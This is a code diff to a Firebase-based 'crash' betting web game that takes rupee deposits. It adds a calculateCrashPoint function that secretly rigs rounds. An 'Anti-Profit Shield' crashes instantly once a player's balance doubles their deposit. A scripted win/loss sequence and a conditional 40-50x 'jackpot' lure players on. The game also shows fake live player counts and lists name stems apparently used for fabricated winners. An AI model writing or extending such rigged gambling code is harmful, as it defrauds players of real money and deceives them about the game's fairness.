@@ -161,11 +161,20 @@ const firebaseConfig = { apiKey: "AIzaSyBXZaME3Z0rd_jsa5LpVG5ZbLpvf6cbu8M", data
 firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 const db = firebase.database();
+
+// Sounds Setup
+const flySound = new Audio('https://files.catbox.moe/6797x7.mp3');
+const crashSound = new Audio('https://files.catbox.moe/9v9r38.mp3');
 const cashoutSound = new Audio('https://files.catbox.moe/v6p5at.mp3');
 
-let uid, userEmail, balance = 0, wager = 0, mult = 1.0, isFlying = false, isWaiting = true, currentPlayers = 1245;
+let uid, userEmail, balance = 0, wager = 0, depBal = 0, mult = 1.0, isFlying = false, isWaiting = true, currentPlayers = 1245;
 let b1 = { active: false, amt: 0, cashed: false }, b2 = { active: false, amt: 0, cashed: false };
 let isLoginMode = true;
+
+// Smart Control Variables
+let betCounter = 0; 
+let crashPoint = 1.0;
+let userEarlyCashout = false;
 
 const pakGmails = ["ali", "khan", "hamza", "ahmed", "waseem", "malik", "rana", "jutt", "asif", "nomi", "sunny", "bilal"];
 const pakAmts = [200, 500, 1000, 2000, 5000];
@@ -183,7 +192,7 @@ function handleAuth() {
         auth.signInWithEmailAndPassword(e, p).catch(err => alert(err.message));
     } else {
         auth.createUserWithEmailAndPassword(e, p).then(res => {
-            db.ref('users/' + res.user.uid).set({ email: e, balance: 100, wager: 0 });
+            db.ref('users/' + res.user.uid).set({ email: e, balance: 100, wager: 0, depositBal: 100 });
         }).catch(err => alert(err.message));
     }
 }
@@ -196,7 +205,9 @@ auth.onAuthStateChanged(user => {
         document.getElementById('app').style.display = 'block';
         db.ref('users/' + uid).on('value', s => {
             if(s.exists()){
-                balance = s.val().balance || 0; wager = s.val().wager || 0;
+                balance = s.val().balance || 0; 
+                wager = s.val().wager || 0;
+                depBal = s.val().depositBal || 100;
                 document.getElementById('uBal').innerText = balance.toFixed(2);
                 document.getElementById('profData').innerHTML = `<b>Email:</b> ${userEmail}<br><b>Wager:</b> Rs ${wager.toFixed(0)} / 5000`;
             }
@@ -208,6 +219,31 @@ auth.onAuthStateChanged(user => {
     }
 });
 
+function calculateCrashPoint() {
+    // Condition 1: Anti-Profit Shield (Double balance check)
+    if (balance >= (depBal * 2)) {
+        return 1.00; 
+    }
+
+    betCounter++;
+    if (betCounter > 10) {
+        // Condition 2: 50x Jackpot Logic
+        if (userEarlyCashout) {
+            betCounter = 0;
+            userEarlyCashout = false;
+            return (Math.random() * 10 + 40).toFixed(2); // 40x to 50x
+        } else {
+            betCounter = 1; // Reset if user didn't cash out early
+        }
+    }
+
+    // Condition 3: Sequence Logic
+    if (betCounter <= 3) return (Math.random() * 3 + 2).toFixed(2); // 3 bets: 2x to 5x
+    if (betCounter == 4) return (Math.random() * 5 + 5).toFixed(2); // 1 bet: 5x to 10x
+    if (betCounter <= 6) return 1.00; // 2 bets: 1.0x (Instant Crash)
+    return (Math.random() * 0.4 + 1.0).toFixed(2); // 4 bets: 1.0x to 1.4x
+}
+
 function start7sTimer() {
     let t = 7; isWaiting = true; isFlying = false;
     document.getElementById('tBox').style.display = 'block';
@@ -215,13 +251,17 @@ function start7sTimer() {
     document.getElementById('mVal').innerText = "WAITING";
     document.getElementById('mVal').style.color = "white";
     
-    // Players increase during waiting
     currentPlayers = Math.floor(Math.random() * (1500 - 1100) + 1100);
     document.getElementById('pCount').innerText = currentPlayers;
 
     let timer = setInterval(() => {
         document.getElementById('tBox').innerText = `Next Round: ${t}s`;
-        if(t <= 0) { clearInterval(timer); document.getElementById('tBox').style.display = 'none'; launchPlane(); }
+        if(t <= 0) { 
+            clearInterval(timer); 
+            document.getElementById('tBox').style.display = 'none'; 
+            crashPoint = calculateCrashPoint();
+            launchPlane(); 
+        }
         t--;
     }, 1000);
 }
@@ -229,6 +269,7 @@ function start7sTimer() {
 function launchPlane() {
     isWaiting = false; isFlying = true; mult = 1.0;
     document.getElementById('plane').style.display = 'block';
+    try { flySound.play(); flySound.loop = true; } catch(e){}
     
     [1, 2].forEach(id => {
         let b = id === 1 ? b1 : b2;
@@ -243,7 +284,6 @@ function launchPlane() {
         mult += 0.01;
         document.getElementById('mVal').innerText = mult.toFixed(2) + "x";
 
-        // Players decrease live as plane flies
         if(currentPlayers > 50 && Math.random() < 0.4) {
             currentPlayers -= Math.floor(Math.random() * 15);
             document.getElementById('pCount').innerText = currentPlayers;
@@ -259,16 +299,23 @@ function launchPlane() {
         });
 
         document.getElementById('plane').style.left = (10 + (mult * 2.2)) + "%";
-        if(Math.random() < 0.015) crash(); else setTimeout(engine, 100);
+        
+        if(mult >= crashPoint) {
+            crash();
+        } else {
+            setTimeout(engine, 100);
+        }
     }
     engine();
 }
 
 function crash() {
-    isFlying = false; document.getElementById('mVal').innerText = "FLEW AWAY!";
+    isFlying = false; 
+    try { flySound.pause(); flySound.currentTime = 0; crashSound.play(); } catch(e){}
+    document.getElementById('mVal').innerText = "FLEW AWAY!";
     document.getElementById('mVal').style.color = "red";
     document.getElementById('plane').style.display = 'none';
-    addHistoryTag(mult.toFixed(2));
+    addHistoryTag(parseFloat(crashPoint).toFixed(2));
     [1, 2].forEach(id => {
         let b = (id === 1) ? b1 : b2; b.active = false; b.cashed = false;
         document.getElementById('btn'+id).innerText = "BET";
@@ -286,7 +333,12 @@ function handleBet(id) {
         db.ref('users/'+uid).update({ balance: balance - amt, wager: wager + amt });
         b.active = true; b.amt = amt; btn.innerText = "CANCEL"; btn.style.background = "#991b1b";
     } else if(isFlying && b.active && !b.cashed) {
-        let win = b.amt * mult; db.ref('users/'+uid).update({ balance: balance + win });
+        let win = b.amt * mult; 
+        
+        // Track early cashout for the 50x Jackpot condition
+        if (mult < 5.0) { userEarlyCashout = true; }
+        
+        db.ref('users/'+uid).update({ balance: balance + win });
         b.cashed = true; btn.innerText = "WON!"; btn.style.background = "#155724";
         try { cashoutSound.play(); } catch(e){}
         document.getElementById('pop-win-val').innerText = mult.toFixed(2) + "x";
@@ -341,7 +393,12 @@ function loadHistory() {
 
 function submitDep() {
     let a = document.getElementById('dAmt').value, t = document.getElementById('dTid').value;
-    if(a && t) { db.ref('requests').push({uid, email: userEmail, amount: a, tid: t, type: 'deposit', status: 'pending'}); alert("Deposit Request Sent!"); toggleTab(); }
+    if(a && t) { 
+        db.ref('requests').push({uid, email: userEmail, amount: a, tid: t, type: 'deposit', status: 'pending'}); 
+        // Sync depositBal for logic
+        db.ref('users/'+uid).update({ depositBal: parseFloat(a) });
+        alert("Deposit Request Sent!"); toggleTab(); 
+    }
 }
 
 function submitWit() {
@@ -353,5 +410,4 @@ function submitWit() {
 }
 </script>
 </body>
-    </html>
-    
+</html>
